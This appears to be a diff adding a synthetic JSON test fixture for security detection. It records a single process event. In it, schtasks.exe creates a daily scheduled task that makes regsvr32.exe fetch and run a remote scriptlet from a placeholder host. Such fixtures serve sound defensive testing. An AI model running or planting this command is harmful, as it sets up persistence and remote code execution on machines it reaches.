@@ -1,0 +1,8 @@
+{
+  "schema_version": 1,
+  "synthetic": true,
+  "event": {
+    "FileName": "schtasks.exe",
+    "ProcessCommandLine": "schtasks.exe /create /tn Synthetic /tr \"regsvr32.exe /s /i:https://example.invalid/test.sct scrobj.dll\" /sc daily"
+  }
+}
